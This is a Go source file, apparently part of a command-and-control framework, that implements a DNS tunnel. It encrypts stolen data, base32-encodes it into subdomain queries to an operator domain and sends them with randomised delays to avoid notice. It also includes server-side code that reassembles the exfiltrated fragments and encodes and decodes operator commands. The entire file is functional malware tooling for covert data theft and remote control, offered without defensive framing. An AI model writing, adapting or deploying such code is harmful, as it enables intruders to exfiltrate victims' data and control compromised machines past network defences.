// Package dns provides DNS tunneling for secondary C2 communication.
package dns

import (
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/saviorSEC/ranger/internal/crypto"
)

// Tunnel provides DNS-based data exfiltration and command reception.
type Tunnel struct {
	Domain     string
	Key        []byte
	chunkSize  int
	seenChunks map[string]map[int]string // sessionID -> seq -> chunk
	mu         sync.Mutex
}

// Fragment represents a single DNS query fragment.
type Fragment struct {
	Seq        int
	Chunk      string
	FileMarker string
	SessionID  string
}

// New creates a DNS tunnel.
func New(domain string, key []byte) *Tunnel {
	return &Tunnel{
		Domain:     domain,
		Key:        key,
		chunkSize:  60,
		seenChunks: make(map[string]map[int]string),
	}
}

// Exfiltrate fragments data into DNS queries and sends them.
// Uses base32 for DNS-safe encoding with XChaCha20-Poly1305 encryption.
func (t *Tunnel) Exfiltrate(data []byte, filename string) error {
	// Encrypt
	encrypted, err := crypto.EncryptWithAEAD(t.Key, data)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	// Base32 encode
	encoded := strings.TrimRight(base32.StdEncoding.EncodeToString(encrypted), "=")

	sessionID := fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	fileTag := "data"
	if filename != "" {
		fileTag = strings.TrimRight(base32.StdEncoding.EncodeToString([]byte(filename))[:20], "=")
	}

	// Fragment
	chunks := splitString(encoded, t.chunkSize)

	for i, chunk := range chunks {
		query := fmt.Sprintf("v%04x.%s.%s.%s.%s", i, chunk, fileTag, sessionID, t.Domain)

		// Ensure DNS length limit
		if len(query) > 253 {
			subchunks := splitString(chunk, 40)
			for j, sub := range subchunks {
				subQ := fmt.Sprintf("v%04xs%02x.%s.%s.%s.%s", i, j, sub, fileTag, sessionID, t.Domain)
				resolveDNS(subQ)
				time.Sleep(time.Duration(100+rand.Intn(200)) * time.Millisecond)
			}
		} else {
			resolveDNS(query)
		}

		if i < len(chunks)-1 {
			time.Sleep(time.Duration(300+rand.Intn(700)) * time.Millisecond)
		}
	}

	return nil
}

// Reconstruct reassembles fragmented data from a complete session.
func (t *Tunnel) Reconstruct(sessionID string) ([]byte, error) {
	t.mu.Lock()
	chunks, ok := t.seenChunks[sessionID]
	delete(t.seenChunks, sessionID)
	t.mu.Unlock()

	if !ok || len(chunks) == 0 {
		return nil, fmt.Errorf("no chunks for session %s", sessionID)
	}

	// Sort by sequence
	var sorted []string
	maxSeq := 0
	for seq := range chunks {
		if seq > maxSeq {
			maxSeq = seq
		}
	}
	for i := 0; i <= maxSeq; i++ {
		if c, ok := chunks[i]; ok {
			sorted = append(sorted, c)
		}
	}

	encoded := strings.Join(sorted, "")

	// Pad for base32
	switch len(encoded) % 8 {
	case 2:
		encoded += "======"
	case 4:
		encoded += "===="
	case 5:
		encoded += "==="
	case 7:
		encoded += "="
	}

	encrypted, err := base32.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("base32 decode: %w", err)
	}

	return crypto.DecryptWithAEAD(t.Key, encrypted)
}

// ParseFragment extracts fragment data from a DNS query name.
func (t *Tunnel) ParseFragment(qname string) *Fragment {
	qname = strings.TrimSuffix(qname, ".")
	if !strings.HasSuffix(qname, t.Domain) {
		return nil
	}

	subdomain := strings.TrimSuffix(qname, "."+t.Domain)
	parts := strings.Split(subdomain, ".")

	if len(parts) < 4 || !strings.HasPrefix(parts[0], "v") {
		return nil
	}

	seqStr := strings.TrimPrefix(parts[0], "v")
	seq := 0
	fmt.Sscanf(seqStr, "%04x", &seq)

	return &Fragment{
		Seq:        seq,
		Chunk:      parts[1],
		FileMarker: parts[2],
		SessionID:  parts[3],
	}
}

// ReceiveFragment stores a received fragment for later reconstruction.
func (t *Tunnel) ReceiveFragment(f *Fragment) (complete bool) {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.seenChunks[f.SessionID] == nil {
		t.seenChunks[f.SessionID] = make(map[int]string)
	}
	t.seenChunks[f.SessionID][f.Seq] = f.Chunk

	// Check if session looks complete (last chunk < 60 chars)
	return len(f.Chunk) < t.chunkSize
}

// EncodeCommand encodes a command into DNS-safe format.
func (t *Tunnel) EncodeCommand(cmd string) (string, error) {
	encrypted, err := crypto.EncryptWithAEAD(t.Key, []byte(cmd))
	if err != nil {
		return "", err
	}
	return base64.RawStdEncoding.EncodeToString(encrypted), nil
}

// DecodeCommand decodes a DNS response into a command.
func (t *Tunnel) DecodeCommand(encoded string) (string, error) {
	raw, err := base64.RawStdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	dec, err := crypto.DecryptWithAEAD(t.Key, raw)
	if err != nil {
		return "", err
	}
	return string(dec), nil
}

func resolveDNS(query string) {
	net.LookupHost(query)
}

func splitString(s string, n int) []string {
	var chunks []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}
